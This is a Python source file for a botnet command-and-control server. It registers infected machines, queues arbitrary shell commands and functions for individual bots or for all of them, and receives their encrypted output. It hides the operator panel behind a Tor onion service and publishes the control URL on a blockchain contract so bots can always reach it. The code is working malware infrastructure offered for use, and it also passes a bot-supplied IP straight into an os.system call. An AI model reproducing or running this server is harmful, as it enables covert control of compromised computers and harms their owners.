import os
import sys
import socket
import subprocess
import base64
import json
import time
import random
import threading
import platform
import socks
import logging
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from scapy.all import sr, IP, ICMP, TCP, ARP, Ether
from netaddr import IPNetwork, IPAddress
import requests
import stem
import shutil
import getpass
import argparse
import zipfile, io
import urllib.request, ipaddress
import tarfile
import cv2
import psutil
from subprocess import Popen, PIPE
import csv
import stat
from urllib.parse import urlparse
from flask import Flask, request, jsonify, send_from_directory
from typing import Dict, List, Optional, Tuple

CURRENT_DIR = Path(__file__).resolve().parent
PROJECT_ROOT = CURRENT_DIR.parent
GHOST_COMM_ROOT = PROJECT_ROOT / "Ghost_Comm"
TORSITE_ROOT = GHOST_COMM_ROOT / "NODES" / "torsite"
GUI_INDEX_HTML = CURRENT_DIR / "WEB-GUI" / "GUI-index.html"

if str(GHOST_COMM_ROOT) not in sys.path:
    sys.path.insert(0, str(GHOST_COMM_ROOT))

try:
    from update_torsite_html import update_hidden_service_html
except ImportError:
    update_hidden_service_html = None

app = Flask(__name__)

# --- Configuration ---
ENCRYPTION_KEY = b'sixteen byte key'
CONTROL_URL_PATH = Path.home() / "CONTROL-URL"

# --- Logging ---
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(threadName)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger('C2')

_control_url_state = {"value": None, "mtime": None}


def _sync_control_url_html(onion_url: str) -> None:
    """Ensure the torsite hidden service serves the botnet GUI."""
    if not onion_url:
        logger.debug("No onion URL provided for HTML sync.")
        return

    if update_hidden_service_html is None:
        logger.warning("update_torsite_html module unavailable; cannot sync onion HTML.")
        return

    parsed = urlparse(onion_url if "://" in onion_url else f"http://{onion_url}")
    onion_host = parsed.hostname or parsed.path
    if not onion_host:
        logger.warning("Failed to parse onion host from CONTROL-URL: %s", onion_url)
        return

    if not GUI_INDEX_HTML.is_file():
        logger.warning("GUI index HTML missing at %s; skipping sync.", GUI_INDEX_HTML)
        return

    if not TORSITE_ROOT.is_dir():
        logger.warning("Torsite root directory missing at %s; cannot sync onion HTML.", TORSITE_ROOT)
        return

    try:
        destination = update_hidden_service_html(
            onion_address=onion_host,
            html_source=GUI_INDEX_HTML,
            torsite_root=TORSITE_ROOT,
            output_name="index.html",
            backup=True,
        )
    except Exception:
        logger.exception("Failed to sync torsite HTML for %s", onion_host)
        return

    logger.info("Synced torsite HTML for %s -> %s", onion_host, destination)

def get_control_url(path: Path = CONTROL_URL_PATH):
    """Return the current control URL, reloading the file when it changes."""
    global _control_url_state

    try:
        stat_result = path.stat()
        mtime = stat_result.st_mtime
    except FileNotFoundError:
        if _control_url_state["value"]:
            logger.warning("CONTROL-URL file missing; retaining last known value.")
        _control_url_state = {"value": None, "mtime": None}
        return None
    except Exception:
        logger.exception("Failed to stat CONTROL-URL file.")
        return _control_url_state["value"]

    if _control_url_state["mtime"] != mtime:
        try:
            url = path.read_text(encoding='utf-8').strip()
            if not url:
                raise ValueError("CONTROL-URL file is empty.")
        except ValueError:
            logger.error("CONTROL-URL file is empty.")
            _control_url_state["value"] = None
            _control_url_state["mtime"] = mtime
            return None
        except Exception:
            logger.exception("Failed to read CONTROL-URL file.")
            return _control_url_state["value"]

        previous = _control_url_state["value"]
        _control_url_state["value"] = url
        _control_url_state["mtime"] = mtime
        if url != previous:
            logger.info(f"Control URL updated to {url}")
            _sync_control_url_html(url)
        else:
            logger.debug("CONTROL-URL file touched but URL unchanged.")

    return _control_url_state["value"]

# Prime the cache so the operator sees the initial state in the logs.
_initial_control_url = get_control_url()
if _initial_control_url:
    logger.info(f"Active control URL set to {_initial_control_url}")
else:
    logger.warning("Control URL is not set; check CONTROL-URL file.")

# --- Bot Management ---
bots = {}
commands: Dict[str, List[Dict[str, object]]] = {}

# Each entry in command_history is a dict describing the lifecycle of a command
# for a single bot target. command_index allows quick lookups by bot+command_id.
command_history: List[Dict[str, object]] = []
command_index: Dict[str, Dict[str, object]] = {}
COMMAND_HISTORY_LIMIT = 500


def _history_key(bot_id: str, command_id: int) -> str:
    return f"{bot_id}:{command_id}"


def _prune_history() -> None:
    """Keep the command history bounded by evicting completed entries."""
    while len(command_history) > COMMAND_HISTORY_LIMIT:
        oldest = command_history[0]
        if oldest.get("status") != "completed":
            break
        command_history.pop(0)
        key = _history_key(oldest["bot_id"], oldest["command_id"])
        if command_index.get(key) is oldest:
            command_index.pop(key, None)


def _ensure_command_id(requested_id, bot_id: str) -> int:
    """Return a unique integer command_id for the given bot."""
    candidate: Optional[int] = None
    if requested_id is not None:
        try:
            candidate = int(requested_id)
        except (TypeError, ValueError):
            candidate = None

    attempts = 0
    while candidate is None or _history_key(bot_id, candidate) in command_index:
        candidate = random.randint(1000, 9999)
        attempts += 1
        if attempts > 10000:
            raise RuntimeError("Unable to allocate unique command_id.")
    return candidate


def _build_instruction(command_type: str, data: Dict[str, object]) -> Tuple[Dict[str, object], Dict[str, object]]:
    """Create a bot-facing instruction payload and the metadata for history tracking."""
    payload: Dict[str, object] = {
        "type": command_type,
    }
    history_payload: Dict[str, object] = {"type": command_type}

    if command_type == "command":
        command_text = data.get("command")
        if not command_text:
            raise ValueError("Missing command text")
        payload["command"] = command_text
        history_payload["command"] = command_text
    elif command_type == "function":
        function_name = data.get("function")
        if not function_name:
            raise ValueError("Missing function name")
        payload["function"] = function_name
        history_payload["function"] = function_name
        params = data.get("params") or {}
        history_payload["params"] = params
        if params:
            payload["params"] = params
    else:
        raise ValueError(f"Unsupported command type '{command_type}'")

    return payload, history_payload


def _enqueue_command(request_json: Dict[str, object]) -> Tuple[List[Dict[str, object]], Dict[str, object]]:
    """Common logic for enqueuing commands via v1 or v2 endpoints."""
    targets = request_json.get("targets") or []
    if not isinstance(targets, list):
        raise ValueError("targets must be a list")
    targets = [str(t).strip() for t in targets if str(t).strip()]

    broadcast = bool(request_json.get("broadcast"))
    if not targets and broadcast:
        targets = list(bots.keys())

    if not targets:
        raise ValueError("Missing targets")

    command_type = (request_json.get("type") or "command").lower()
    instruction_template, history_template = _build_instruction(command_type, request_json)

    issued_by = request_json.get("issued_by")
    metadata = request_json.get("metadata") if isinstance(request_json.get("metadata"), dict) else {}

    response_meta = {
        "command_type": command_type,
        "targets": targets,
        "broadcast": broadcast,
    }

    created_records: List[Dict[str, object]] = []

    for bot_id in targets:
        command_id = _ensure_command_id(request_json.get("command_id"), bot_id)

        instruction = dict(instruction_template)
        instruction["command_id"] = command_id

        record_payload = dict(history_template)

        history_entry = {
            "command_id": command_id,
            "bot_id": bot_id,
            "type": history_template.get("type"),
            "status": "queued",
            "created_at": time.time(),
            "delivered_at": None,
            "completed_at": None,
            "issued_by": issued_by,
            "broadcast": broadcast,
            "metadata": metadata,
            "payload": record_payload,
            "response": None,
        }

        if history_template.get("command") is not None:
            record_payload["command"] = history_template["command"]
        if history_template.get("function") is not None:
            record_payload["function"] = history_template["function"]
        if history_template.get("params") is not None:
            record_payload["params"] = history_template["params"]

        queue_entry = {"instruction": instruction, "record": history_entry}
        if bot_id not in commands:
            commands[bot_id] = []
        commands[bot_id].append(queue_entry)

        key = _history_key(bot_id, command_id)
        command_index[key] = history_entry
        command_history.append(history_entry)
        created_records.append(history_entry)

    _prune_history()
    return created_records, response_meta

# --- Encryption/Decryption ---
def encrypt_data(data):
    logger.debug(f"Encrypting data of length {len(data)} bytes.")
    try:
        cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
        iv = base64.b64encode(cipher.iv).decode('utf-8')
        ct = base64.b64encode(ct_bytes).decode('utf-8')
        encrypted_string = iv + ct
        logger.debug(f"Encryption successful. Result length: {len(encrypted_string)}")
        return encrypted_string
    except Exception:
        logger.exception("An unexpected error occurred during data encryption.")
        raise

def decrypt_data(encrypted_data):
    logger.debug(f"Decrypting data of length {len(encrypted_data)} bytes.")
    try:
        iv = base64.b64decode(encrypted_data[:24])
        ct = base64.b64decode(encrypted_data[24:])
        cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        decrypted_string = pt.decode()
        logger.debug(f"Decryption successful. Result length: {len(decrypted_string)}")
        return decrypted_string
    except Exception:
        logger.exception("An unexpected error occurred during data decryption.")
        raise

# --- API Endpoints ---
@app.route('/api/bot/register', methods=['POST'])
def register_bot():
    encrypted_data = request.data
    decrypted_data = decrypt_data(encrypted_data)
    data = json.loads(decrypted_data)
    bot_id = data.get('id')
    info = data.get('info')
    public_ip = info.get('ip')
    bots[bot_id] = {'info': info, 'last_seen': time.time(), 'public_ip': public_ip, 'status': 'green'}
    logger.info(f"Registered new bot: {bot_id} with public IP: {public_ip}")
    response_payload = {'status': 'ok'}
    control_url = get_control_url()
    if control_url:
        response_payload['control_url'] = control_url
    return jsonify(response_payload)

@app.route('/api/bot/ping', methods=['POST'])
def ping():
    encrypted_data = request.data
    decrypted_data = decrypt_data(encrypted_data)
    data = json.loads(decrypted_data)
    bot_id = data.get('id')
    if bot_id in bots:
        bots[bot_id]['last_seen'] = time.time()
        logger.info(f"Received ping from bot: {bot_id}")
        response_payload = {'status': 'ok', 'output': 'pong'}
        control_url = get_control_url()
        if control_url:
            response_payload['control_url'] = control_url
        return jsonify(response_payload)
    else:
        logger.warning(f"Received ping from unknown bot: {bot_id}")
        return jsonify({'status': 'error', 'output': 'not registered'})

@app.route('/api/bot/poll/<bot_id>', methods=['GET'])
def poll_commands(bot_id):
    if bot_id in commands and commands[bot_id]:
        entry = commands[bot_id].pop(0)
        record = entry["record"]
        record["status"] = "dispatched"
        record["delivered_at"] = time.time()
        instruction = entry["instruction"]
        encrypted_command = encrypt_data(json.dumps(instruction))
        logger.info(f"Sending command to bot {bot_id}: {instruction}")
        return encrypted_command
    else:
        response_payload = {'status': 'ok', 'output': 'no commands'}
        control_url = get_control_url()
        if control_url:
            response_payload['control_url'] = control_url
        return jsonify(response_payload)

@app.route('/api/bot/response/<bot_id>', methods=['POST'])
def receive_response(bot_id):
    encrypted_data = request.data
    decrypted_data = decrypt_data(encrypted_data)
    data = json.loads(decrypted_data)
    command_id = data.get('command_id')
    output = data.get('output')
    logger.info(f"Received response from bot {bot_id} for command {command_id}: {output}")

    key = None
    if command_id is not None:
        try:
            key = _history_key(str(bot_id), int(command_id))
        except (TypeError, ValueError):
            logger.debug("Invalid command_id from bot %s: %r", bot_id, command_id)
            key = None
    if key and key in command_index:
        record = command_index[key]
        record["status"] = "completed"
        record["completed_at"] = time.time()
        record["response"] = output
    else:
        logger.debug(f"No command history entry found for bot {bot_id} command_id {command_id}")

    return jsonify({'status': 'ok'})

@app.route('/api/bot/log/<bot_id>', methods=['POST'])
def receive_log(bot_id):
    log_entry = request.data.decode()
    logger.info(f"[BOT LOG - {bot_id}] {log_entry}")
    return jsonify({'status': 'ok'})

def check_bot_statuses():
    while True:
        for bot_id, bot_data in list(bots.items()):
            if time.time() - bot_data.get('last_seen', 0) > 60:
                # Bot is offline from C2 perspective, check public IP
                if bot_data.get('public_ip'):
                    response = os.system("ping -c 1 " + bot_data['public_ip'])
                    if response == 0:
                        bots[bot_id]['status'] = 'yellow'
                    else:
                        bots[bot_id]['status'] = 'red'
                else:
                    bots[bot_id]['status'] = 'red' # No public IP to check
            else:
                bots[bot_id]['status'] = 'green'
        time.sleep(30)

@app.route('/api/bots')
def get_bots():
    return jsonify(bots)

@app.route('/api/v2/c2/command', methods=['POST'])
def issue_c2_command_v2():
    data = request.get_json(silent=True) or {}

    try:
        created, meta = _enqueue_command(data)
    except ValueError as exc:
        return jsonify({'status': 'error', 'message': str(exc)}), 400
    except Exception as exc:  # unexpected
        logger.exception("Failed to enqueue v2 command.")
        return jsonify({'status': 'error', 'message': 'Internal server error'}), 500

    logger.info(
        "Issued %s to bots: %s",
        meta["command_type"],
        ", ".join(meta["targets"]),
    )

    response_body = {
        'status': 'ok',
        'metadata': meta,
        'commands': [
            {
                'bot_id': record['bot_id'],
                'command_id': record['command_id'],
                'status': record['status'],
            }
            for record in created
        ],
    }
    return jsonify(response_body)


@app.route('/api/v2/c2/commands', methods=['GET'])
def get_all_commands_v2():
    module_filter = request.args.get('module')

    def _matches(record: Dict[str, object]) -> bool:
        if not module_filter:
            return True
        metadata = record.get('metadata') or {}
        return metadata.get('module') == module_filter

    filtered = [record for record in command_history if _matches(record)]
    filtered.sort(key=lambda item: item.get('created_at') or 0, reverse=True)
    return jsonify({'commands': filtered})


@app.route('/api/c2/commands', methods=['GET'])
def get_all_commands():
    """Backward compatible endpoint returning the same payload as v2."""
    return get_all_commands_v2()


@app.route('/api/c2/command', methods=['POST'])
def issue_c2_command():
    """Legacy command endpoint: only supports simple command dispatch."""
    data = request.get_json(silent=True) or {}
    if 'command' not in data:
        return jsonify({'status': 'error', 'message': 'Missing command'}), 400
    data.setdefault('type', 'command')

    try:
        created, meta = _enqueue_command(data)
    except ValueError as exc:
        return jsonify({'status': 'error', 'message': str(exc)}), 400
    except Exception:
        logger.exception("Failed to enqueue legacy command.")
        return jsonify({'status': 'error', 'message': 'Internal server error'}), 500

    logger.info(
        "Issued legacy command '%s' to bots: %s",
        data.get('command'),
        ", ".join(meta['targets']),
    )

    return jsonify({'status': 'ok'})

from blockchain_utils import compile_contract, deploy_contract, get_contract_instance, set_c2_url
from web3 import Web3

# --- Blockchain Integration ---
GANACHE_URL = "http://127.0.0.1:7545"
CONTRACT_META_FILE = "contract_meta.json"

def update_c2_url_on_blockchain(c2_url):
    try:
        with open(CONTRACT_META_FILE, 'r') as f:
            contract_meta = json.load(f)
        w3 = Web3(Web3.HTTPProvider(GANACHE_URL))
        contract_instance = get_contract_instance(w3, contract_meta['address'], contract_meta['abi'])
        set_c2_url(contract_instance, w3, c2_url)
        logger.info(f"Successfully updated C2 URL on the blockchain: {c2_url}")
    except FileNotFoundError:
        logger.warning(f"{CONTRACT_META_FILE} not found. Deploying a new contract.")
        with open('C2UrlRegistry.sol', 'r') as f:
            solidity_source = f.read()
        w3 = Web3(Web3.HTTPProvider(GANACHE_URL))
        contract_interface = compile_contract(solidity_source)
        contract_address = deploy_contract(w3, contract_interface)
        logger.info(f"Contract deployed at: {contract_address}")
        with open(CONTRACT_META_FILE, 'w') as f:
            json.dump({
                'address': contract_address,
                'abi': contract_interface['abi']
            }, f)
        contract_instance = get_contract_instance(w3, contract_address, contract_interface['abi'])
        set_c2_url(contract_instance, w3, c2_url)
        logger.info(f"Successfully updated C2 URL on the blockchain: {c2_url}")
    except Exception as e:
        logger.error(f"Error updating C2 URL on the blockchain: {e}")

def main():
    # Start status checking thread
    status_thread = threading.Thread(target=check_bot_statuses)
    status_thread.daemon = True
    status_thread.start()

    # Ensure torsite HTML matches the current CONTROL-URL at startup
    current_url = get_control_url()
    if current_url:
        _sync_control_url_html(current_url)
        update_c2_url_on_blockchain(current_url)

    # Start Flask server
    control_url_for_display = get_control_url()
    if control_url_for_display:
        message = f"C2 server running on http://127.0.0.1:5000 and accessible via onion address: {control_url_for_display}"
        logger.info(message)
        print(f"[*] {message}")
    else:
        logger.warning("No control URL configured; update CONTROL-URL for onion address.")
    
    app.run(host='0.0.0.0', port=5000)

@app.route('/')
def index():
    return send_from_directory('WEB-GUI', 'GUI-index.html')

@app.route('/<module>')
def module_page(module):
    return send_from_directory(os.path.join('WEB-GUI', module), 'index.html')

@app.route('/GUI-style.css')
def style():
    return send_from_directory('WEB-GUI', 'GUI-style.css')

if __name__ == '__main__':
    main()
